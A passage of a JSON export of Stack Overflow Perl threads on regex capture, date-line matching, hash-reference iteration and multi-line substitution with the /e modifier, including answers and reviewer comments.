4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "edited": false, "score": 0, "creation_date": 1577393023, "post_id": 59474021, "comment_id": 105160653, "body": "@zdim i generally don&#39;t include it in my scripts because when i run perl scripts on my system, it will automatically give me the fail reason when dying (i include <code>use autodie</code> in my scripts)"}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "edited": false, "score": 1, "creation_date": 1577393261, "post_id": 59474021, "comment_id": 105160716, "body": "OK, <code>autodie</code> does that (what I incidentally used in my answer here while I normally don&#39;t).  But then you don&#39;t need <code>or die</code> at all -- which is why I commented, seeing <code>die</code> without <code>$!</code>. I&#39;d suggest to include that <code>use autodie;</code> in your code here (I&#39;d comment if there weren&#39;t <code>die</code> at all, too :), along with <code>warnings</code> and <code>strict</code> -- you&#39;ll invariably get comments when they&#39;re missing."}], "answers": [{"comments": [{"owner": {"reputation": 4234, "user_id": 12313309, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/3fPDo.jpg?s=128&g=1", "display_name": "Polar Bear", "link": "https://stackoverflow.com/users/12313309/polar-bear"}, "edited": false, "score": 1, "creation_date": 1577246814, "post_id": 59475030, "comment_id": 105128374, "body": "@ikegami please look into the code once more - it opens files &#39;cat.txt&#39; and &#39;dog.txt&#39; only once each (once for each hash key)."}, {"owner": {"reputation": 82895, "user_id": 372239, "user_type": "registered", "accept_rate": 80, "profile_image": "https://i.stack.imgur.com/2twLb.jpg?s=128&g=1", "display_name": "Toto", "link": "https://stackoverflow.com/users/372239/toto"}, "edited": false, "score": 0, "creation_date": 1577357322, "post_id": 59475030, "comment_id": 105149445, "body": "Use of bareword as filehandle is strongly discouraged, <a href=\"https://perldoc.perl.org/5.30.0/functions/open.html\" rel=\"nofollow noreferrer\">open</a>"}], "tags": [], "owner": {"reputation": 4234, "user_id": 12313309, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/3fPDo.jpg?s=128&g=1", "display_name": "Polar Bear", "link": "https://stackoverflow.com/users/12313309/polar-bear"}, "is_accepted": false, "score": 1, "last_activity_date": 1577245691, "last_edit_date": 1577245691, "creation_date": 1577245207, "answer_id": 59475030, "question_id": 59474021, "link": "https://stackoverflow.com/questions/59474021/using-regex-to-match-pattern-and-store-into-array/59475030#59475030", "title": "Using Regex to match pattern and store into array", "body": "<p>Following code does what you are looking for</p>\n\n<pre><code>use strict;\nuse warnings;\n\nuse feature 'say';\n\nuse Data::Dumper;\n\nmy $debug = 0;\n\n# define match pattern\nmy $patern = qr/\\d{2}(week\\d{2}\\w).+(cat|dog)/;\n\nmy %hash;                               # define hash to store data\n\nwhile( &lt;DATA&gt; ) {                       # read from DATA block\n    next if /^$/;                       # skip empty lines\n    chomp;                              # trim newline\n\n    push @{$hash{$2}},$1 if /$patern/;  # fill the hash if match pattern\n}\n\nsay Dumper(\\%hash) if $debug;           # look into hash in debug mode\n\nwhile( my($k,$v) = each %hash ) {       # go through hash\n    my $filename = $k . '.txt';         # define filename\n\n    open FH, \"&gt; $filename\"              # open file\n            or die \"Couldn't open $filename\";\n    print FH join \"\\n\", sort @{$v};     # print data into a file\n    close FH;                           # close file\n}\n\n__DATA__\n/mypath/sd-urt7-dfc-adfj345h-d0-79week48a-DFC-lk-my_cat.text  \n/mypath/sd-urt7-afd-parent-79week46d-AFD-lk-my_cat.text  \n/mypath/sd-urt7-ert-parent-79week50c-ERT-lk-my_cat.text \n/mypath/sd-urt7-dfc-adfj345h-d0-79week48a-DFC-lk-my_dog.text  \n/mypath/sd-urt7-afd-parent-79week46d-AFD-lk-my_dog.text  \n/mypath/sd-urt7-ert-parent-79week49b-ERT-lk-my_dog.text\n</code></pre>\n\n<p><strong>OUTPUT</strong> </p>\n\n<p>cat.txt</p>\n\n<pre><code>week46d\nweek48a\nweek50c\n</code></pre>\n\n<p>dog.txt</p>\n\n<pre><code>week46d\nweek48a\nweek49b\n</code></pre>\n\n<p>You need to start read some <strong>Perl programming</strong> <a href=\"https://docstore.mik.ua/orelly/perl4/index.htm\" rel=\"nofollow noreferrer\">books</a></p>\n"}, {"comments": [{"owner": {"reputation": 478, "user_id": 7484043, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c553310d1ad27e031be3aefb8127db4f?s=128&d=identicon&r=PG&f=1", "display_name": "programminglearner", "link": "https://stackoverflow.com/users/7484043/programminglearner"}, "edited": false, "score": 0, "creation_date": 1577392563, "post_id": 59475145, "comment_id": 105160540, "body": "perfect answer :) My question was finding a way to use the regex in the simplest way possible and this was straight to the point! kudos to @zdim for the mapping method, as well."}], "tags": [], "owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "is_accepted": true, "score": 3, "last_activity_date": 1577246773, "creation_date": 1577246773, "answer_id": 59475145, "question_id": 59474021, "link": "https://stackoverflow.com/questions/59474021/using-regex-to-match-pattern-and-store-into-array/59475145#59475145", "title": "Using Regex to match pattern and store into array", "body": "<pre><code>use strict;\nuse warnings;\nuse feature 'say';\n\nopen(my $in_fh, '&lt;', \"file.txt\")\n   or die(\"Can't open \\\"file.txt\\\": $!\\n\");    \nopen(my $cat_fh, '&gt;', \"cat.txt\")\n   or die(\"Can't create \\\"cat.txt\\\": $!\\n\");\nopen(my $dog_fh, '&gt;', \"dog.txt\")\n   or die(\"Can't create \\\"dog.txt\\\": $!\\n\");\n\nwhile (&lt;$in_fh&gt;) {\n   chomp;\n   if ( my ($week) = /79(week\\d+[a-z])/i) {\n      if    (/cat/) { say $cat_fh $week; }\n      elsif (/dog/) { say $dog_fh $week; }\n   }\n}\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "edited": false, "score": 0, "creation_date": 1580800636, "post_id": 59475817, "comment_id": 106206862, "body": "really <code>my ($p1, $p2) = map { my $q = quotemeta; qr&#47;$q&#47; } qw(cat dog);</code>"}], "tags": [], "owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "is_accepted": false, "score": 6, "last_activity_date": 1577299089, "last_edit_date": 1577299089, "creation_date": 1577255614, "answer_id": 59475817, "question_id": 59474021, "link": "https://stackoverflow.com/questions/59474021/using-regex-to-match-pattern-and-store-into-array/59475817#59475817", "title": "Using Regex to match pattern and store into array", "body": "<pre><code>use warnings;\nuse strict;\nuse feature 'say';\nuse autodie qw(open);\n\nmy $file = shift // die \"Usage: $0 filename\\n\";  #/\n\n# Patterns that determine what file to write to    \nmy ($p1, $p2) = qw(cat dog);\n\n# Open output files, one for each pattern\nmy %fh_out = map { open my $fh, '&gt;', \"$_.txt\"; $_ =&gt; $fh } ($p1, $p2); \n\nopen my $fh, '&lt;', $file;\n\nwhile (&lt;$fh&gt;) {\n    if ( my ($week, $type) = /79(week\\d+[a-z]).*?($p1|$p2)/i ) {\n        say {$fh{$type}} $week;\n    }\n}\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 4234, "user_id": 12313309, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/3fPDo.jpg?s=128&g=1", "display_name": "Polar Bear", "link": "https://stackoverflow.com/users/12313309/polar-bear"}, "is_accepted": false, "score": 0, "last_activity_date": 1577263826, "last_edit_date": 1577263826, "creation_date": 1577262913, "answer_id": 59476599, "question_id": 59474021, "link": "https://stackoverflow.com/questions/59474021/using-regex-to-match-pattern-and-store-into-array/59476599#59476599", "title": "Using Regex to match pattern and store into array", "body": "<p>Code with utilization of <strong>map</strong> simplifies the code</p>\n\n<pre><code>use strict;\nuse warnings;\n\nuse feature 'say';\n\nuse Data::Dumper;\n\nmy $debug = 0;\n\n# define match pattern\nmy $patern = qr/\\d{2}(week\\d{2}\\w).+(cat|dog)/;\n\nmy %hash;                               # define hash to store data\n\n# fill the hash if match pattern\nmap { push @{$hash{$2}},$1 if /$patern/ } &lt;DATA&gt;;\n\nsay Dumper(\\%hash) if $debug;           # look into hash in debug mode\n\nforeach my $animal (keys %hash) {       # extract 'animal' from hash\n    open FH, \"&gt; $animal.txt\"            # open file\n            or die \"Couldn't open $animal.txt\";\n    map { say FH $_ } sort @{$hash{$animal}};       # print data into a file\n    close FH;                           # close file\n}\n\n__DATA__\n/mypath/sd-urt7-dfc-adfj345h-d0-79week48a-DFC-lk-my_cat.text  \n/mypath/sd-urt7-afd-parent-79week46d-AFD-lk-my_cat.text  \n/mypath/sd-urt7-ert-parent-79week50c-ERT-lk-my_cat.text \n/mypath/sd-urt7-dfc-adfj345h-d0-79week48a-DFC-lk-my_dog.text  \n/mypath/sd-urt7-afd-parent-79week46d-AFD-lk-my_dog.text  \n/mypath/sd-urt7-ert-parent-79week49b-ERT-lk-my_dog.text\n</code></pre>\n"}], "owner": {"reputation": 478, "user_id": 7484043, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c553310d1ad27e031be3aefb8127db4f?s=128&d=identicon&r=PG&f=1", "display_name": "programminglearner", "link": "https://stackoverflow.com/users/7484043/programminglearner"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 129, "favorite_count": 0, "accepted_answer_id": 59475145, "answer_count": 4, "score": 3, "last_activity_date": 1577692596, "creation_date": 1577228703, "last_edit_date": 1577692596, "question_id": 59474021, "link": "https://stackoverflow.com/questions/59474021/using-regex-to-match-pattern-and-store-into-array", "title": "Using Regex to match pattern and store into array", "body": "<p>I had a similar post on this (see <a href=\"https://stackoverflow.com/questions/59439561/perl-matching-part-of-string\">other post</a>), but what I am trying to do has slightly varied since then. I am using the same regex matching <code>/79(week\\d+[a-z])/i</code> from that question.</p>\n\n<p>I have a file that contains six lines, each line a different path. As an example, there are 3 lines including the string \"cat\" and 3 lines including the string \"dog\".</p>\n\n<p>file.txt</p>\n\n<pre><code>/mypath/sd-urt7-dfc-adfj345h-d0-79week48a-DFC-lk-my_cat.text  \n/mypath/sd-urt7-afd-parent-79week46d-AFD-lk-my_cat.text  \n/mypath/sd-urt7-ert-parent-79week50c-ERT-lk-my_cat.text \n/mypath/sd-urt7-dfc-adfj345h-d0-79week48a-DFC-lk-my_dog.text  \n/mypath/sd-urt7-afd-parent-79week46d-AFD-lk-my_dog.text  \n/mypath/sd-urt7-ert-parent-79week49b-ERT-lk-my_dog.text \n</code></pre>\n\n<p>I want to take the \"weekxxX\" portion out of each path and print it out into a file. Here is what I have so far:</p>\n\n<pre><code>use strict;\nuse warnings;\nuse feature qw(say);\nuse autodie;\n\n    open (my $fh, '&lt;', \"file.txt\") or die \"Couldn't open `file.txt`\\n\";\n\n    foreach my $line (&lt;$fh&gt;){ #goes through each line in the file\n\n        chomp $line; #chomps new line character from each line\n\n        if ($line =~ /cat/) { #if the path includes string \"cat\"\n            #use the regex at top of post to get weekxxX of each\n            #path containing cat and print all 3 weekxxX into \n            #another file called cat.  \n\n            open (my $cat, '&gt;', \"cat.txt\") or die;\n            print $cat \"\";\n            close $cat; \n\n        }\n        elsif ($line =~ /dog/) { #otherwise if the path includes string \"dog\"3\n\n            #use the regex at top of post to get weekxxX of each\n            #path containing cat and print all 3 weekxxX into \n            #another file called dog.  \n\n            open (my $dog, '&gt;', \"dog.txt\") or die;\n            print $dog \"\";\n            close $dog;\n        }\n    }\n    close $fh;\n</code></pre>\n\n<p>I am thinking this can be done by using regex on all three paths (depending on whether it is dog or cat), push all three weeks in format weekxxX into an array and then print that array into the file? I'm really not sure how to implement this. </p>\n"}, {"tags": ["regex", "perl", "regex-lookarounds"], "comments": [{"owner": {"reputation": 481636, "user_id": 3832970, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/64323e6cf08401474da3bf770ea13b58?s=128&d=identicon&r=PG&f=1", "display_name": "Wiktor Stribi\u017cew", "link": "https://stackoverflow.com/users/3832970/wiktor-stribi%c5%bcew"}, "edited": false, "score": 0, "creation_date": 1577226445, "post_id": 59473812, "comment_id": 105126021, "body": "So do you want to capture <code>AM</code> and <code>PM</code> into Group 2 with your first regex? Right now, you may use <code>&#47;(Sent):\\s*(.*[AP]M)\\h*$&#47;</code> and <code>&#47;(Sent):(?!.*[AP]M\\h*$)\\s*(.+)&#47;</code>, but you need to precise these patterns according to what should land in the capturing groups."}, {"owner": {"reputation": 589595, "user_id": 1491895, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/82f9e178a16364bf561d0ed4da09a35d?s=128&d=identicon&r=PG", "display_name": "Barmar", "link": "https://stackoverflow.com/users/1491895/barmar"}, "edited": false, "score": 1, "creation_date": 1577227144, "post_id": 59473812, "comment_id": 105126109, "body": "Why don&#39;t you just do something like <code>if ($line =~ &#47;AM|PM&#47;) { ... } else { ... }</code> to handle the two formats?"}], "answers": [{"tags": [], "owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "is_accepted": false, "score": 1, "last_activity_date": 1577246364, "creation_date": 1577246364, "answer_id": 59475117, "question_id": 59473812, "link": "https://stackoverflow.com/questions/59473812/regex-match-look-ahead-assertions/59475117#59475117", "title": "REGEX match - look ahead assertions", "body": "<pre><code>if ( my ($sent) = $line =~ /Sent:\\s*(.*)/ ) {\n   print \"= $sent\\n\" if $sent =~ /[AP]M\\s*$/;\n   print \"! $sent\\n\" if $sent !~ /[AP]M\\s*$/;\n}\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 4234, "user_id": 12313309, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/3fPDo.jpg?s=128&g=1", "display_name": "Polar Bear", "link": "https://stackoverflow.com/users/12313309/polar-bear"}, "is_accepted": false, "score": 0, "last_activity_date": 1577247638, "creation_date": 1577247638, "answer_id": 59475195, "question_id": 59473812, "link": "https://stackoverflow.com/questions/59473812/regex-match-look-ahead-assertions/59475195#59475195", "title": "REGEX match - look ahead assertions", "body": "<p>Does the following code extract dates correctly?</p>\n\n<pre><code>use strict;\nuse warnings;\n\nuse feature 'say';\n\nmy $pattern = qr/Sent:\\s+(.*?)\\s*$/;\n\nmy $date;\n\nwhile( &lt;DATA&gt; ) {\n    next if /^$/;\n\n    $date = undef;\n    $date = $1 if /$pattern/;\n\n    say \"[$date]\" if $date;\n}\n\n__DATA__\nSent: Mon Nov 13 12:34:10 2006 \nSent: Fri Apr 13 12:34:10 2007 \nSent: Sat Jun 13 12:34:10 2009 \nSome extra line to skip\nSent: Tuesday, November 14, 2006 10:58 AM \nSent: Monday, November 16, 2006  6:20 AM \nSent: Thursday, November 17, 2006  8:18 PM \nOther extra line to skip\nSent: Wednesday, December 4,  2006  1:06 PM \n</code></pre>\n\n<p>output</p>\n\n<pre><code>[Mon Nov 13 12:34:10 2006]\n[Fri Apr 13 12:34:10 2007]\n[Sat Jun 13 12:34:10 2009]\n[Tuesday, November 14, 2006 10:58 AM]\n[Monday, November 16, 2006  6:20 AM]\n[Thursday, November 17, 2006  8:18 PM]\n[Wednesday, December 4,  2006  1:06 PM]\n</code></pre>\n"}], "owner": {"reputation": 37, "user_id": 8935823, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/be5728fe714d2f06c514fb50dfed53c3?s=128&d=identicon&r=PG&f=1", "display_name": "H Foucault", "link": "https://stackoverflow.com/users/8935823/h-foucault"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 47, "favorite_count": 0, "answer_count": 2, "score": 0, "last_activity_date": 1577266738, "creation_date": 1577226136, "last_edit_date": 1577266738, "question_id": 59473812, "link": "https://stackoverflow.com/questions/59473812/regex-match-look-ahead-assertions", "title": "REGEX match - look ahead assertions", "body": "<p>I am trying to parse a file and capture all the \"sent\" dates. The format of the dates vary, so I am looking for patterns and adding the format ( to give to Time::Piece::strptime ) .\nMy date patterns are as follows  \"Mon Nov 13 12:34:10 2006\" or \"Tuesday, November 14, 2006 10:58 AM\".\nI used a look ahead assertion to see if the end was AM or PM and handle the two cases\nI was reading the file line by line and writing the following code:</p>\n\n<pre><code>    print \"$2&lt;-\\n\" if $line =~ /(Sent):\\s*([^\\n]+)(?&lt;=AM|PM)$/;\n    print \"$2&lt;- \\n\" if $line =~ /(Sent):\\s*([^\\n]+)(?&lt;!AM|PM)$/; \n</code></pre>\n\n<p>The problem I ran into was that sometimes I have a whitespace at the end of the lines before the newlines. Like so \"Tuesday, November 14, 2006 10:58 AM \", or \"Mon Nov 13 12:34:10 2006 \". I can't figure out how to write the look ahead and see if does or doesnot have an AM or PM and then a possible space at the end. It ends up matching both times. \nI know I could break the loop ( put a proper block when matching and then break out with a \"next\" once I match the first one ) but I really want to understand what the regex engine is doing. Also, why does $2 contain the AM and PM ? \nThanks</p>\n"}, {"tags": ["perl", "artificial-intelligence", "hash-of-hashes"], "comments": [{"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "edited": false, "score": 2, "creation_date": 1577218881, "post_id": 59473039, "comment_id": 105124652, "body": "&quot;<i>Is there a better more effective way...</i>&quot; -- yes: <a href=\"https://metacpan.org/pod/Data::Dump\" rel=\"nofollow noreferrer\">Data::Dump</a> (with its <code>dd</code> and <code>pp</code>), <a href=\"https://perldoc.perl.org/Data/Dumper.html\" rel=\"nofollow noreferrer\">Data::Dumper</a> (core), and more"}], "owner": {"reputation": 576, "user_id": 5252277, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/jxfJU.jpg?s=128&g=1", "display_name": "gatorreina", "link": "https://stackoverflow.com/users/5252277/gatorreina"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 40, "favorite_count": 0, "answer_count": 0, "score": 1, "last_activity_date": 1577218055, "creation_date": 1577218055, "question_id": 59473039, "link": "https://stackoverflow.com/questions/59473039/how-to-interpret-hash-reference-results-of-perl-aiclassifiertextfilelear", "title": "How to interpret (hash reference) results of perl AI::Classifier::Text::FileLearner;", "body": "<p>I am trying my own perl \"AI hello world\" and having a hard time understanding the results of AI::Classifier::Text::FileLearner;</p>\n\n<p>I believe I have gone astray in iterating through the hash references. </p>\n\n<pre><code>#!/usr/bin/perl\n\nuse utf8;\nuse strict;\nuse warnings;\n\nuse AI::Classifier::Text::FileLearner;\nmy $iterator = AI::Classifier::Text::FileLearner-&gt;new( training_dir =&gt; '/home/pi/20_newsgroups/talk.politics.guns' );\n\nprint \"getting ready to classify\\n\";\nmy $classifier = $iterator-&gt;classifier;\n\nmy $key;\nmy $value;\nmy %hash = %$classifier;\n# traversing the hash using \"each\" function \nwhile(($key, $value) = each (%hash)) \n{ \n\n    # do stuff \n    $value = $hash{$key};\n    #print ref{$value};\n    if (ref{$value} eq 'HASH') {\n\n    print \"$value is ANOTHER hash reference\\n\";\n    my %hash2 = %$value; #derefrence it\n    while(($key, $value) = each (%hash2)) \n    {\n\n        # do stuff \n        $value = $hash2{$key};\n        print \"Value of $key is $value\\n\";  \n\n    }\n\n\n    } else {\n\n    print \"Value of $key is $value\\n\";  \n\n    }\n\n\n} # end of 1st while \n</code></pre>\n\n<p>Is there a better more effective way to try to iterate through these hash references so that I can see the results of the training?</p>\n"}, {"tags": ["regex", "perl", "line-breaks", "substitution"], "comments": [{"owner": {"user_type": "does_not_exist", "display_name": "user12097764"}, "edited": false, "score": 0, "creation_date": 1577209536, "post_id": 59461785, "comment_id": 105122429, "body": "Without a compelling argument to use the eval form of regex substitution, there is no need to use it. The rule of thumb is that the replacement side can be used as a callback, either as a direct Perl statement or a function call. Basically it says code logic has to be performed on the replacement based on the match of the regex (ie: groups). Also, using eval has some side effects to watch out for using <code>s&#47;&#47;&#47;e</code> or even <code>s&#47;&#47;&#47;ee</code>. Otherwise string interpolation should be adequete. The example you&#39;ve shown saying <code>not helpful</code> is not true as it works just fine."}, {"owner": {"reputation": 3828, "user_id": 960115, "user_type": "registered", "accept_rate": 92, "profile_image": "https://i.stack.imgur.com/oZ1UM.gif?s=128&g=1", "display_name": "Jeff G", "link": "https://stackoverflow.com/users/960115/jeff-g"}, "edited": false, "score": 1, "creation_date": 1577344598, "post_id": 59461785, "comment_id": 105145540, "body": "@x15 Yes, in my contrived example the <i>not helpful</i> code works just fine.  The point of adding that section to my question is because my true replacement string is something incredibly complex and interleaved, such as <code>$1abcd$2bcde$3cdef$1defg$2efgh$3fghi...</code>  In cases like this, there is no way to apply such a solution, and I didn&#39;t want a bunch of answers that addressed my contrived example, but failed to help me with my real-world problem.  I felt that adding a bunch of <code>$1</code> and <code>$2</code> variables into the long string would reduce readability, without adding clarity to the question."}, {"owner": {"user_type": "does_not_exist", "display_name": "user12097764"}, "edited": false, "score": 0, "creation_date": 1577440397, "post_id": 59461785, "comment_id": 105170583, "body": "Repeating, there is no reason given anywhere in the question that justifies using eval form of regex substitution. And, unless your familiar with its usage, it can be tricky and bite if done incorrectly, or for no use whatsoever. Is there something difficult to read here ? <code>${1}abcd${2}bcde${3}cdef${1}defg${2}efgh${3}fghi</code>. Compared to what ?"}], "answers": [{"tags": [], "owner": {"reputation": 8718, "user_id": 5848200, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a8072aaf76dcb4fe5027964252f16382?s=128&d=identicon&r=PG", "display_name": "Grinnz", "link": "https://stackoverflow.com/users/5848200/grinnz"}, "is_accepted": true, "score": 3, "last_activity_date": 1577139441, "creation_date": 1577139441, "answer_id": 59461840, "question_id": 59461785, "link": "https://stackoverflow.com/questions/59461785/perl-split-long-substitution-regex-over-multiple-lines/59461840#59461840", "title": "Perl Split Long Substitution Regex Over Multiple Lines", "body": "<p>The replacement component of the <code>s///</code> operator is not a regex, and is not affected by the <code>/x</code> modifier. It is a string, similar to the contents of a double quoted string or backticks. Your only options are to construct it in a variable like you alluded to, or apply the <code>/e</code> modifier, which turns the replacement into a perl expression, in which you could construct the string, but you need to quote the parts since bareword strings are not allowed under strict.</p>\n\n<pre><code>use strict;\nuse warnings;\n$var =~ s/(some)(thing)/'A_very_long_string_with_many_characters_that_should_be_split_over_' .\n      qq{multiple_lines_but_can't_be_for_whatever_reason._The_matching_groups_are_\"$1\"_and_\"$2\"}/e;\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "is_accepted": false, "score": 7, "last_activity_date": 1577140568, "last_edit_date": 1577140568, "creation_date": 1577139945, "answer_id": 59461880, "question_id": 59461785, "link": "https://stackoverflow.com/questions/59461785/perl-split-long-substitution-regex-over-multiple-lines/59461880#59461880", "title": "Perl Split Long Substitution Regex Over Multiple Lines", "body": "<p>The replacement side is a string, subject to a few specific modifiers. A distinct case is <code>/e</code>, when the replacement side is evaluated as code instead. But if it is a plain string, then how it is evaluated isn't affected by (any?) modifiers, and surely not by <code>/x</code> since spaces count in a string.  </p>\n\n<p>If you use <code>/e</code> then you can write code in the replacement side as you wish and then you can form your replacement string piece-meal wise.</p>\n\n<p>One way is to use a sub to neatly organize the building of the replacement string under <code>/e</code> </p>\n\n<pre><code>$var =~ s/(some)(thing)/build_repl($1, $2)/e;\n\nsub build_repl {\n    my ($c1, $c2) = @_;\n    return \n        qq(A_very_long...) .\n        qq(The_matching...$c1...$c2);\n}\n</code></pre>\n"}], "owner": {"reputation": 3828, "user_id": 960115, "user_type": "registered", "accept_rate": 92, "profile_image": "https://i.stack.imgur.com/oZ1UM.gif?s=128&g=1", "display_name": "Jeff G", "link": "https://stackoverflow.com/users/960115/jeff-g"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 246, "favorite_count": 0, "accepted_answer_id": 59461840, "answer_count": 2, "score": 2, "last_activity_date": 1577141275, "creation_date": 1577139115, "last_edit_date": 1577141275, "question_id": 59461785, "link": "https://stackoverflow.com/questions/59461785/perl-split-long-substitution-regex-over-multiple-lines", "title": "Perl Split Long Substitution Regex Over Multiple Lines", "body": "<p>I have a very long substitution string in a Perl regular expression, which I would like to split over multiple lines.  What is the syntax to split long substitution strings over multiple lines?  I have tried the following, without success (the whitespace isn't ignored):</p>\n\n<pre><code>$var =~ s/(some)(thing)/A_very_long_string_with_many_characters_that_should_be_split_over_\n          multiple_lines_but_can't_be_for_whatever_reason._The_matching_groups_are_\"$1\"_and_\"$2\"/x;\n</code></pre>\n\n<p>My regex replacement string is much more interleaved that this contrived example, so I can't just put the large literal portion into a variable.  In other words, the following is <strong>not</strong> helpful in my case:</p>\n\n<pre><code>my $prefix = 'A_very_long_string_with_many_characters_that_should_be_split_over_' .\n             'multiple_lines_but_can\\'t_be_for_whatever_reason._The_matching_groups_are_';\n$var =~ s/(some)(thing)/$prefix\"$1\"_and_\"$2\"/;\n</code></pre>\n\n<p>Does anyone know of a way to split substitution strings over multiple lines?</p>\n"}, {"tags": ["perl"], "comments": [{"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "edited": false, "score": 4, "creation_date": 1577138395, "post_id": 59461659, "comment_id": 105104371, "body": "Can you not explain a little better what you have and what you are doing?  Sure, you can &quot;bundle&quot; parameters into various data structures, or an object, but there are quite a few ways to do that (or something yet else).  The question is just too broad as it stands, I suggest you edit it to explain nicely what you have/need."}, {"owner": {"reputation": 171, "user_id": 2799433, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b011e057102e676020e526b0b82f1949?s=128&d=identicon&r=PG&f=1", "display_name": "user2799433", "link": "https://stackoverflow.com/users/2799433/user2799433"}, "reply_to_user": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "edited": false, "score": 0, "creation_date": 1577138680, "post_id": 59461659, "comment_id": 105104438, "body": "I feel a function with too many parameters is not easy to read and use."}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "edited": false, "score": 1, "creation_date": 1577138917, "post_id": 59461659, "comment_id": 105104482, "body": "OK. But there are many ways to organize that -- and how to do it well depends a lot on details of what your function does and what those parameters are.  Put them in array or a hash?  Or a hash with arrayrefs, to group different kinds of parameters?  Or perhaps a class?  Or maybe the program should be re-organized, and then there won&#39;t be so many loose parameters (but there would be a few objects instead)?"}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "edited": false, "score": 1, "creation_date": 1577139324, "post_id": 59461659, "comment_id": 105104570, "body": "It&#39;s great that you are asking a question like this, as a good interface to a function is very important.  But there are many ways to approach that in general and more detail in the question would be very helpful for more specific and effective suggestions."}, {"owner": {"reputation": 171, "user_id": 2799433, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b011e057102e676020e526b0b82f1949?s=128&d=identicon&r=PG&f=1", "display_name": "user2799433", "link": "https://stackoverflow.com/users/2799433/user2799433"}, "reply_to_user": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "edited": false, "score": 0, "creation_date": 1577140240, "post_id": 59461659, "comment_id": 105104796, "body": "my function is to get values like name, age, ... and search the database"}], "answers": [{"comments": [{"owner": {"reputation": 171, "user_id": 2799433, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b011e057102e676020e526b0b82f1949?s=128&d=identicon&r=PG&f=1", "display_name": "user2799433", "link": "https://stackoverflow.com/users/2799433/user2799433"}, "edited": false, "score": 0, "creation_date": 1577140029, "post_id": 59461789, "comment_id": 105104754, "body": "A named parameters list with default values, this is what I want. Thanks @sobrique"}], "tags": [], "owner": {"reputation": 51521, "user_id": 2566198, "user_type": "registered", "accept_rate": 67, 